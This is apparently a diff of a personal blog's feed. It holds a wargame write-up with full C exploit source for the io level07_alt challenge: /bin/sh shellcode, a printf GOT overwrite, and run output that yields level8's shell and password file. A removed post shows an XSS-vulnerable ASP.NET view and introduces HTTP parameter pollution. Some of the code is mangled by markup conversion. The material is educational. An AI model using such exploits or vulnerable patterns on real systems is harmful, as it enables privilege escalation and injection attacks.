-<p>static const char<em> target = "/levels/level07_alt";
-static const char</em> shellcode =
-"\x31\xc0\xb0\x46\x31\xdb\x31\xc9"
-"\xcd\x80\xeb\x16\x5b\x31\xc0\x88"
-"\x43\x07\x89\x5b\x08\x89\x43\x0c"
-"\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c"
-"\xcd\x80\xe8\xe5\xff\xff\xff\x2f"
-"\x62\x69\x6e\x2f\x73\x68\x58\x41"
-"\x41\x41\x41\x42\x42\x42\x42\x90";</p>
-
-<p>// this is the address of the count array in memory
-static const unsigned int countAddress = 0x08049720;</p>
-
-<p>// address of the printf GOT entry
-static const unsigned int printfAddress = 0x80496e8;
-// initial value of the printf GOT entry
-static const unsigned int printfValue = 0x080482de;</p>
-
-<p>// The index into the count array which stores the first
-// instruction which will be executed when the program
-// attempts to print out the results.
-static const unsigned int instructionStartIndex = 0x34;</p>
-
-<p>// there are all the opcodes we need to write to
-// the count array (in little-endian order)
-static const unsigned int movEaxEcx = 0xC889;
-static const unsigned int incIncEcx = 0x4141;
-static const unsigned int movEcxEcx = 0x98B;
-static const unsigned int jmpEcx = 0x21FF;</p>
-
-<p>// Helper function which gives us the index into the count
-// array that we would need in order to write a value to the
-// given targetAddress.
-unsigned int getIndex(unsigned int targetAddress)
-{
-  if (targetAddress &lt; countAddress)
-  {</p>
-
-<pre><code>return 0x100 - (countAddress - targetAddress &gt;&gt; 2);
-</code></pre>
-
-<p>  }</p>
-
-<p>  return (targetAddress - countAddress) >> 2;
-}</p>
-
-<p>// Helper function which takes a buffer, a value, and a counter and will
-// repeatedly write the value to the buffer until the appropriate number of
-// writes has happened. It'll return a pointer to the memory location
-// which immediately follows where it finished off.
-unsigned char<em> repeat(unsigned char</em> destination, unsigned char value, int count)
-{
-  int i;</p>
-
-<p>  for (i = 0; i &lt; count; ++i)
-  {</p>
-
-<pre><code>*destination++ = value;
-</code></pre>
-
-<p>  }</p>
-
-<p>  return destination;
-}</p>
-
-<p>int main()
-{
-  // calculate some offets and indexes
-  unsigned int startInstructionAddress = instructionStartIndex * 4 + countAddress;
-  unsigned int printfIndex = getIndex(printfAddress);
-  unsigned int printfInc = startInstructionAddress - printfValue;
-  unsigned int argBufSize = printfInc + movEaxEcx + incIncEcx * 2 + movEcxEcx + jmpEcx;</p>
-
-<p>  unsigned char* cursor;</p>
-
-<p>  // allocate some memory for our command line arguments and null terminate it
-  unsigned char<em> argBuf = (unsigned char</em>)malloc(argBufSize + 1);
-  argBuf[argBufSize] = 0;</p>
-
-<p>  // start by writing data required to point the printf entry to our location
-  // in the count array that contains our instructions
-  cursor = repeat(argBuf, printfIndex, printfInc);
-  // then write all our opcodes
-  cursor = repeat(cursor, instructionStartIndex, movEaxEcx);
-  cursor = repeat(cursor, instructionStartIndex + 1, incIncEcx);
-  cursor = repeat(cursor, instructionStartIndex + 2, incIncEcx);
-  cursor = repeat(cursor, instructionStartIndex + 3, movEcxEcx);
-  repeat(cursor, instructionStartIndex + 4, jmpEcx);</p>
-
-<p>  printf("Attempting to exploit, good luck!\n");
-  // finally invoke the program, passing in the shell code and
-  // making sure that EAX contains 8 at the right time.
-  execl(target, shellcode, "\x08", argBuf, (char*)0);</p>
-
-<p>  free(argBuf);</p>
-
-<p>  return EXIT_SUCCESS;
-}
-{% endcodeblock %}</p>
+<p><div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>Exploit Source  </span></figcaption>
+ <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+<span class='line-number'>59</span>
+<span class='line-number'>60</span>
+<span class='line-number'>61</span>
+<span class='line-number'>62</span>
+<span class='line-number'>63</span>
+<span class='line-number'>64</span>
+<span class='line-number'>65</span>
+<span class='line-number'>66</span>
+<span class='line-number'>67</span>
+<span class='line-number'>68</span>
+<span class='line-number'>69</span>
+<span class='line-number'>70</span>
+<span class='line-number'>71</span>
+<span class='line-number'>72</span>
+<span class='line-number'>73</span>
+<span class='line-number'>74</span>
+<span class='line-number'>75</span>
+<span class='line-number'>76</span>
+<span class='line-number'>77</span>
+<span class='line-number'>78</span>
+<span class='line-number'>79</span>
+<span class='line-number'>80</span>
+<span class='line-number'>81</span>
+<span class='line-number'>82</span>
+<span class='line-number'>83</span>
+<span class='line-number'>84</span>
+<span class='line-number'>85</span>
+<span class='line-number'>86</span>
+<span class='line-number'>87</span>
+<span class='line-number'>88</span>
+<span class='line-number'>89</span>
+<span class='line-number'>90</span>
+<span class='line-number'>91</span>
+<span class='line-number'>92</span>
+<span class='line-number'>93</span>
+<span class='line-number'>94</span>
+<span class='line-number'>95</span>
+<span class='line-number'>96</span>
+<span class='line-number'>97</span>
+<span class='line-number'>98</span>
+<span class='line-number'>99</span>
+<span class='line-number'>100</span>
+<span class='line-number'>101</span>
+<span class='line-number'>102</span>
+<span class='line-number'>103</span>
+<span class='line-number'>104</span>
+<span class='line-number'>105</span>
+<span class='line-number'>106</span>
+<span class='line-number'>107</span>
+<span class='line-number'>108</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">stdio</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">stdlib</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">string</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">unistd</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">static</span> <span class="k">const</span> <span class="kt">char</span><span class="o">&lt;</span><span class="n">em</span><span class="o">&gt;</span> <span class="n">target</span> <span class="o">=</span> <span class="s">&quot;/levels/level07_alt&quot;</span><span class="p">;</span>
+</span><span class='line'><span class="k">static</span> <span class="k">const</span> <span class="kt">char</span><span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;</span> <span class="n">shellcode</span> <span class="o">=</span>
+</span><span class='line'><span class="s">&quot;</span><span class="se">\x31\xc0\xb0\x46\x31\xdb\x31\xc9</span><span class="s">&quot;</span>
+</span><span class='line'><span class="s">&quot;</span><span class="se">\xcd\x80\xeb\x16\x5b\x31\xc0\x88</span><span class="s">&quot;</span>
+</span><span class='line'><span class="s">&quot;</span><span class="se">\x43\x07\x89\x5b\x08\x89\x43\x0c</span><span class="s">&quot;</span>
+</span><span class='line'><span class="s">&quot;</span><span class="se">\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c</span><span class="s">&quot;</span>
+</span><span class='line'><span class="s">&quot;</span><span class="se">\xcd\x80\xe8\xe5\xff\xff\xff\x2f</span><span class="s">&quot;</span>
+</span><span class='line'><span class="s">&quot;</span><span class="se">\x62\x69\x6e\x2f\x73\x68\x58\x41</span><span class="s">&quot;</span>
+</span><span class='line'><span class="s">&quot;</span><span class="se">\x41\x41\x41\x42\x42\x42\x42\x90</span><span class="s">&quot;</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="c1">// this is the address of the count array in memory</span>
+</span><span class='line'><span class="k">static</span> <span class="k">const</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">countAddress</span> <span class="o">=</span> <span class="mh">0x08049720</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="c1">// address of the printf GOT entry</span>
+</span><span class='line'><span class="k">static</span> <span class="k">const</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">printfAddress</span> <span class="o">=</span> <span class="mh">0x80496e8</span><span class="p">;</span>
+</span><span class='line'><span class="c1">// initial value of the printf GOT entry</span>
+</span><span class='line'><span class="k">static</span> <span class="k">const</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">printfValue</span> <span class="o">=</span> <span class="mh">0x080482de</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="c1">// The index into the count array which stores the first</span>
+</span><span class='line'><span class="c1">// instruction which will be executed when the program</span>
+</span><span class='line'><span class="c1">// attempts to print out the results.</span>
+</span><span class='line'><span class="k">static</span> <span class="k">const</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">instructionStartIndex</span> <span class="o">=</span> <span class="mh">0x34</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="c1">// there are all the opcodes we need to write to</span>
+</span><span class='line'><span class="c1">// the count array (in little-endian order)</span>
+</span><span class='line'><span class="k">static</span> <span class="k">const</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">movEaxEcx</span> <span class="o">=</span> <span class="mh">0xC889</span><span class="p">;</span>
+</span><span class='line'><span class="k">static</span> <span class="k">const</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">incIncEcx</span> <span class="o">=</span> <span class="mh">0x4141</span><span class="p">;</span>
+</span><span class='line'><span class="k">static</span> <span class="k">const</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">movEcxEcx</span> <span class="o">=</span> <span class="mh">0x98B</span><span class="p">;</span>
+</span><span class='line'><span class="k">static</span> <span class="k">const</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">jmpEcx</span> <span class="o">=</span> <span class="mh">0x21FF</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="c1">// Helper function which gives us the index into the count</span>
+</span><span class='line'><span class="c1">// array that we would need in order to write a value to the</span>
+</span><span class='line'><span class="c1">// given targetAddress.</span>
+</span><span class='line'><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">getIndex</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">targetAddress</span><span class="p">)</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">targetAddress</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span> <span class="n">countAddress</span><span class="p">)</span>
+</span><span class='line'>  <span class="p">{</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">pre</span><span class="o">&gt;&lt;</span><span class="n">code</span><span class="o">&gt;</span><span class="k">return</span> <span class="mh">0x100</span> <span class="o">-</span> <span class="p">(</span><span class="n">countAddress</span> <span class="o">-</span> <span class="n">targetAddress</span> <span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span> <span class="mi">2</span><span class="p">);</span>
+</span><span class='line'><span class="o">&lt;/</span><span class="n">code</span><span class="o">&gt;&lt;/</span><span class="n">pre</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="k">return</span> <span class="p">(</span><span class="n">targetAddress</span> <span class="o">-</span> <span class="n">countAddress</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">;</span>
+</span><span class='line'><span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="c1">// Helper function which takes a buffer, a value, and a counter and will</span>
+</span><span class='line'><span class="c1">// repeatedly write the value to the buffer until the appropriate number of</span>
+</span><span class='line'><span class="c1">// writes has happened. It&#39;ll return a pointer to the memory location</span>
+</span><span class='line'><span class="c1">// which immediately follows where it finished off.</span>
+</span><span class='line'><span class="kt">unsigned</span> <span class="kt">char</span><span class="o">&lt;</span><span class="n">em</span><span class="o">&gt;</span> <span class="n">repeat</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span><span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;</span> <span class="n">destination</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">value</span><span class="p">,</span> <span class="kt">int</span> <span class="n">count</span><span class="p">)</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span> <span class="n">count</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span>
+</span><span class='line'>  <span class="p">{</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">pre</span><span class="o">&gt;&lt;</span><span class="n">code</span><span class="o">&gt;*</span><span class="n">destination</span><span class="o">++</span> <span class="o">=</span> <span class="n">value</span><span class="p">;</span>
+</span><span class='line'><span class="o">&lt;/</span><span class="n">code</span><span class="o">&gt;&lt;/</span><span class="n">pre</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="k">return</span> <span class="n">destination</span><span class="p">;</span>
+</span><span class='line'><span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">int</span> <span class="n">main</span><span class="p">()</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>  <span class="c1">// calculate some offets and indexes</span>
+</span><span class='line'>  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">startInstructionAddress</span> <span class="o">=</span> <span class="n">instructionStartIndex</span> <span class="o">*</span> <span class="mi">4</span> <span class="o">+</span> <span class="n">countAddress</span><span class="p">;</span>
+</span><span class='line'>  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">printfIndex</span> <span class="o">=</span> <span class="n">getIndex</span><span class="p">(</span><span class="n">printfAddress</span><span class="p">);</span>
+</span><span class='line'>  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">printfInc</span> <span class="o">=</span> <span class="n">startInstructionAddress</span> <span class="o">-</span> <span class="n">printfValue</span><span class="p">;</span>
+</span><span class='line'>  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">argBufSize</span> <span class="o">=</span> <span class="n">printfInc</span> <span class="o">+</span> <span class="n">movEaxEcx</span> <span class="o">+</span> <span class="n">incIncEcx</span> <span class="o">*</span> <span class="mi">2</span> <span class="o">+</span> <span class="n">movEcxEcx</span> <span class="o">+</span> <span class="n">jmpEcx</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span> <span class="n">cursor</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="c1">// allocate some memory for our command line arguments and null terminate it</span>
+</span><span class='line'>  <span class="kt">unsigned</span> <span class="kt">char</span><span class="o">&lt;</span><span class="n">em</span><span class="o">&gt;</span> <span class="n">argBuf</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span><span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="n">argBufSize</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
+</span><span class='line'>  <span class="n">argBuf</span><span class="p">[</span><span class="n">argBufSize</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="c1">// start by writing data required to point the printf entry to our location</span>
+</span><span class='line'>  <span class="c1">// in the count array that contains our instructions</span>
+</span><span class='line'>  <span class="n">cursor</span> <span class="o">=</span> <span class="n">repeat</span><span class="p">(</span><span class="n">argBuf</span><span class="p">,</span> <span class="n">printfIndex</span><span class="p">,</span> <span class="n">printfInc</span><span class="p">);</span>
+</span><span class='line'>  <span class="c1">// then write all our opcodes</span>
+</span><span class='line'>  <span class="n">cursor</span> <span class="o">=</span> <span class="n">repeat</span><span class="p">(</span><span class="n">cursor</span><span class="p">,</span> <span class="n">instructionStartIndex</span><span class="p">,</span> <span class="n">movEaxEcx</span><span class="p">);</span>
+</span><span class='line'>  <span class="n">cursor</span> <span class="o">=</span> <span class="n">repeat</span><span class="p">(</span><span class="n">cursor</span><span class="p">,</span> <span class="n">instructionStartIndex</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="n">incIncEcx</span><span class="p">);</span>
+</span><span class='line'>  <span class="n">cursor</span> <span class="o">=</span> <span class="n">repeat</span><span class="p">(</span><span class="n">cursor</span><span class="p">,</span> <span class="n">instructionStartIndex</span> <span class="o">+</span> <span class="mi">2</span><span class="p">,</span> <span class="n">incIncEcx</span><span class="p">);</span>
+</span><span class='line'>  <span class="n">cursor</span> <span class="o">=</span> <span class="n">repeat</span><span class="p">(</span><span class="n">cursor</span><span class="p">,</span> <span class="n">instructionStartIndex</span> <span class="o">+</span> <span class="mi">3</span><span class="p">,</span> <span class="n">movEcxEcx</span><span class="p">);</span>
+</span><span class='line'>  <span class="n">repeat</span><span class="p">(</span><span class="n">cursor</span><span class="p">,</span> <span class="n">instructionStartIndex</span> <span class="o">+</span> <span class="mi">4</span><span class="p">,</span> <span class="n">jmpEcx</span><span class="p">);</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Attempting to exploit, good luck!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span class='line'>  <span class="c1">// finally invoke the program, passing in the shell code and</span>
+</span><span class='line'>  <span class="c1">// making sure that EAX contains 8 at the right time.</span>
+</span><span class='line'>  <span class="n">execl</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="s">&quot;</span><span class="se">\x08</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">argBuf</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="mi">0</span><span class="p">);</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">free</span><span class="p">(</span><span class="n">argBuf</span><span class="p">);</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="k">return</span> <span class="n">EXIT_SUCCESS</span><span class="p">;</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure></notextile></div></p>
 
 <p>Upload, compile and run the exploit and this is what happens:</p>
 
-<p>{% codeblock Exploit Run lang:bash %}
-level7@io:/tmp/.oj$ ./sploit
-Attempting to exploit, good luck!
-sh-4.2$ id
-uid=1007(level7) gid=1007(level7) euid=1008(level8) groups=1008(level8),1007(level7),1029(nosu)
-sh-4.2$ cat /home/level8/.pass
-&lt;&lt; -- password was printed here -- >>
-{% endcodeblock %}</p>
+<p><div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>Exploit Run  </span></figcaption>
+ <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>level7@io:/tmp/.oj<span class="nv">$ </span>./sploit
+</span><span class='line'>Attempting to exploit, good luck!
+</span><span class='line'>sh-4.2<span class="nv">$ </span>id
+</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1007<span class="o">(</span>level7<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1007<span class="o">(</span>level7<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>1008<span class="o">(</span>level8<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1008<span class="o">(</span>level8<span class="o">)</span>,1007<span class="o">(</span>level7<span class="o">)</span>,1029<span class="o">(</span>nosu<span class="o">)</span>
+</span><span class='line'>sh-4.2<span class="nv">$ </span>cat /home/level8/.pass
+</span><span class='line'>&amp;lt;&amp;lt; -- password was printed here -- &gt;&gt;
+</span></code></pre></td></tr></table></div></figure></notextile></div></p>
 
 <p>Game over! What a great challenge that was.</p>
 
@@ -1325,160 +1889,6 @@ use Irssi;
 <p>The script should now run fine and <code>irssi</code> should stop complaining.</p>
 
 <p>This might seem obvious to some, but it wasn't to me! From what I can tell other people around the traps have had the same problem so I thought I'd post this in the hope that it helps others.</p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[XSS Flaws via MVC Model Binding and Request.QueryString Inconsistencies]]></title>
-    <link href="http://buffered.io/posts/xss-flaws-via-mvc-model-binding-and-request.querystring-inconsistencies/"/>
-    <updated>2012-11-29T20:50:00+10:00</updated>
-    <id>http://buffered.io/posts/xss-flaws-via-mvc-model-binding-and-request.querystring-inconsistencies</id>
-    <content type="html"><![CDATA[<p>Forgive the title of the post, it was hard coming up with something succinct that captured the purpose of the post. This was inspired by a recent experience with a client who had this exact problem with one of their production systems.</p>
-
-<h2>TL;DR</h2>
-
-<p>Never use [Request.QueryString][] to access parameters in your views, even when you're sure your actions have validated them. You may open your application up to [XSS][] attacks. Always, <em>always</em> use data that is passed to your views via the <code>Model</code> or the [ViewData][] dictionary. Under no circumstances should you trust data coming in from the web, that includes query string parameters.</p>
-
-<!--more-->
-
-
-<h2>Setting the scene</h2>
-
-<p>The application provided a certain function which allowed users to browse information tied to a number of entities. For the sake of this discussion let's say those entities were instances of a <strong>Person</strong>. The number of entities was extremely small, so it was decided that the interface would consist of a drop-down box consisting of all the entities. When that drop-down box was used a <em>change</em> event would fire using JavaScript that would modify the current URL and render a new page. That page would show the same drop-down list, with the appropriate entry selected, along with the information specfic to that entity.</p>
-
-<p>Let's see some code starting with the "details" of the person:</p>
-
-<p>{% codeblock Person.cs lang:csharp %}
-public class Person
-{</p>
-
-<pre><code>public string Name { get;set; }
-public int Age { get; set; }
-</code></pre>
-
-<p>}
-{% endcodeblock %}</p>
-
-<p>Nothing too amazing there. Here's the parts of the page which renders the list of people:</p>
-
-<p>{% codeblock Index.aspx (partial) lang:html %}
-Please choose a person &lt;%= Html.DropDownList("people", Model) %></p>
-
-<script type="text/javascript">
-$(document).ready(function () {
-  $("#people").change(function () {
-    window.location = '<%= Url.Action("Detail", "Person") %>?index=' + $(this).val();
-  });
-});
-</script>
-
-
-<p>{% endcodeblock %}</p>
-
-<p>Again, nothing too mind boggling here either. We can see how the <code>change</code> event fires and updates the <code>window.location</code> and moves the user to the <code>Details</code> page. The <code>Model</code> for this page is of type <code>IEnumerable&lt;SelectListItem&gt;</code>.</p>
-
-<p>Next we'll take a look at the controller action which gets invoked when the drop-down is changed:</p>
-
-<p>{% codeblock PersonController.cs (Partial) lang:csharp %}
-public ActionResult Detail(int index)
-{</p>
-
-<pre><code>return View("Detail", Tuple.Create(People[index], GetPeople()));
-</code></pre>
-
-<p>}
-{% endcodeblock %}</p>
-
-<p>We're using the <code>index</code> parameter (note the <em>type</em> of this parameter, it's important) to index into the list of people we have stashed somewhere to extract the user that is being viewed. This person, along with the full list of people in <code>SelectListItem</code> form, is being passed to the view.</p>
-
-<p>Let's see what the view does with this information:</p>
-
-<p>{% codeblock Detail.aspx (partial) lang:html %}
-Please choose a person &lt;%= Html.DropDownList("people", Model.Item2) %></p>
-
-<script type="text/javascript">
-$(document).ready(function () {
-  $("#people").val(<%= Request.QueryString["index"] %>);
-  $("#people").change(function () {
-    window.location = '<%= Url.Action("Detail", "Person") %>?index=' + $(this).val();
-  });
-});
-</script>
-
-
-
-
-<p>
-<%= Html.Encode(Model.Item1.Name) %> is a whopping <%= Model.Item1.Age %> years old!
-</p>
-{% endcodeblock %}
-
-This is starting to get a bit more interesting. The rendering of the drop-down is the same as before, except it's pulling data from the [System.Tuple][] that was passed in as the `Model`. The event handler that's invoked on `change` is the same, and there's a bit of non-descript content rendering a the bottom. The subtle but important difference is the code that sets the currently selected person in the drop-down.
-
-I plugged this code into a standard MVC application and this is what it looks like:
-
-{% img /uploads/2012/11/xss-index.png 'Choosing a person' %}
-
-After selecting a person from the drop down it looks like this:
-
-{% img /uploads/2012/11/xss-details.png 'Person details' %}
-
-A bad assumption
-----------------
-
-As you already know, ASP.NET MVC has the ability to automatically convert query string parameters into type-safe arguments that are passed into the controller actions. In the above example the `index` query string parameter is converted to an `int` and passed into the `Details` action. If a user attempts to modify this value to something that isn't an integer then MVC will literally poop itself, right?
-
-Let's see.
-
-{% img /uploads/2012/11/xss-type-fail.png 'Person details' %}
-
-OK, so MVC will require that this value be an integer, otherwise the action will fail to be invoked. If that's the case, then the view won't be rendered and our code which directly accesses `Request.QueryString` will not be invoked and hence there's no risk.
-
-Right?
-
-[Wrong][HPP].
-
-The attack vector
------------------
-
-[HTTP Parameter Pollution][HPP] is a relatively "new" problem which revolves around the way that web servers/applications parse and handle multiple instances of the same GET/POST parameter. Phew!
-
-In other words, if a malicious user decides to pass in _another_ instance of the `index` parameter in the query string, what happens? The way this is handled varies from technology to technology (see [slide 9][HPPPDF] for some examples), but here we're only interested in ASP.NET with IIS and MVC.
-
